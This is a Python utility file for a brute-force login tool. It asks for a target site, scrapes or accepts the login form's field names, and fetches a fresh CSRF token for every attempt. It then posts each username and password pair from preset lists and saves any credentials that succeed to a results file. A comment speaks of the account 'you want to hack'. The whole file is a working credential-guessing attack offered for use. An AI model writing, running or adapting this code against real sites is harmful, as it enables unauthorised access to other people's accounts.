# utils.py
# By Sanix-darker

from app.settings import *
import requests
from lxml import html
from sys import exit


def presentation():
    """
    This method just present the app and ask for a choice before starting
    Returns:

    """
    print("[+] # #############################################")
    print("[+] # => Brute Force Login <=                     #")
    print("[+] # By S@n1x d4rk3r                             #")
    print("[+] # #############################################")
    print("[+] Select a mode for detecting fields:")
    print("[+] 1-) Automatic mode (Will get all necessary field and proceed)")
    print("[+] 2-) Manual mode (you will provide necessary information before continue)")
    print("[+] -")
    print("[+] 0-) Stop the program")


def process_request(request, user, password, failed_aftertry):
    """
    This method will proceed the request

    Args:
        request:
        user:
        password:
        failed_aftertry:

    Returns:

    """
    if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
        if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
            print("[+] Connection failed : Trying again ....")
            return
        else:
            failed_aftertry = failed_aftertry + 1
            print("[+] Connection failed : 404 Not Found (Verify your url)")
    else:
        # if you want to see the text result remove the comment here
        # print data.text
        if INCORRECT_MESSAGE[0] in request.text or INCORRECT_MESSAGE[1] in request.text:
            print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
        else:
            if SUCCESS_MESSAGE[0] in request.text or SUCCESS_MESSAGE[1] in request.text:
                result = "\n[+] --------------------------------------------------------------"
                result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + user + " and " \
                                                                                                          "password: " \
                                                                                                          "" + password
                result += "\n[+] --------------------------------------------------------------\n"
                with open("./results.txt", "w+") as frr:
                    frr.write(result)
                print(
                    "[+] A Match succeed 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                          "./results.txt")
                exit()
            else:
                print("Trying theese parameters: user: " + user + " and password: " + password)


def get_csrf_token(url, csrf_field):
    """
    This method will fetch the token in the web-page and return it
    """
    # Get login _token
    print("[+] Connecting to ", url)
    result = requests.get(url)
    tree = html.fromstring(result.text)

    print("[+] Trying to Fetch a token..")
    _token = ""
    try:
        _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
    except Exception as es: pass

    return _token


def process_user(user, url, failed_aftertry, user_field, password_field, csrf_field="_csrf"):
    """[summary]

    Arguments:
        user {[type]} -- [description]
        url {[type]} -- [description]
        failed_aftertry {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    for password in PASSWORDS:
        # Create the payload for the submission form
        payload = {
            user_field: user.replace('\n', ''),
            password_field: password.replace('\n', ''),
            csrf_field: get_csrf_token(url, csrf_field)
        }
        print("[+]", payload)
        # Doing the post form
        request = requests.post(url, data=payload)

        process_request(request, user, password, failed_aftertry)


def try_connection(url, user_field, password_field, csrf_field):
    """[summary]

    Arguments:
        url {[type]} -- [description]
        user_field {[type]} -- [description]
        password_field {[type]} -- [description]
    """
    print("[+] Connecting to: " + url + "......\n")
    # Put the target email you want to hack
    # user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
    failed_aftertry = 0
    for user in USERS:
        process_user(user, url, failed_aftertry, user_field, password_field, csrf_field)


def manual_mode():
    """[summary]
    """
    print("[+] Manual mode selected ")
    print("[+] After inspecting the LOGIN <form />, please fill here :")

    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the target URL (it's the 'action' attribute on the form tag):")
    # The user_field in the form of the login
    user_field = input(
        "\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
    # The password_field in the form
    password_field = input(
        "\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")

    # The password_field in the form
    csrf_field = input(
        "\n[+] Enter the csrf-token field  (it's the 'name' attribute on the Login form for the csrf, leave blank if "
        "this attribute is not present in the form):")

    try_connection(url, user_field, password_field, csrf_field)


def extract_field_form(url, html_contain):
    """[summary]

    Arguments:
        html_contain {[type]} -- [description]
    """
    print("[+] Starting extraction...")
    tree = html.fromstring(html_contain)

    print("[+] Fetching parameters..")
    form_action_url = list(tree.xpath("//form/@action"))[0]
    payload_fetched = list(set(tree.xpath("//form//input")))

    if len(form_action_url) == 0:
        form_action_url = url

    if "http" not in form_action_url:
        form_action_url = url + form_action_url

    print("[++] > action : ", form_action_url)
    fields = []
    for each_element in payload_fetched:
        names = each_element.xpath("//@name")
        types = each_element.xpath("//@type")

        for i, name in enumerate(names):
            if types[i] != "submit" and name != "submit":
                print("[++] > ", str(name), "{" + str(types[i]) + "}")
        fields = names
        break

    if len(fields) == 2:
        fields.append("empty-token-field")

    try_connection(url, fields[0], fields[1], fields[2])


def automatic_mode():
    """[summary]
    """
    print("[+] Starting the automatic mode...")
    # Field's Form -------
    # The link of the website
    url = input("\n[+] Enter the URL of the webSite and let me do the rest :")
    r = requests.get(url)

    extract_field_form(url, r.text)


def main():
    """[summary]
    """
    presentation()
    mode = int(input("[+] Choice: "))
    if mode == 1:
        automatic_mode()
    elif mode == 2:
        manual_mode()
    elif mode == 0:
        exit()
    else:
        main()
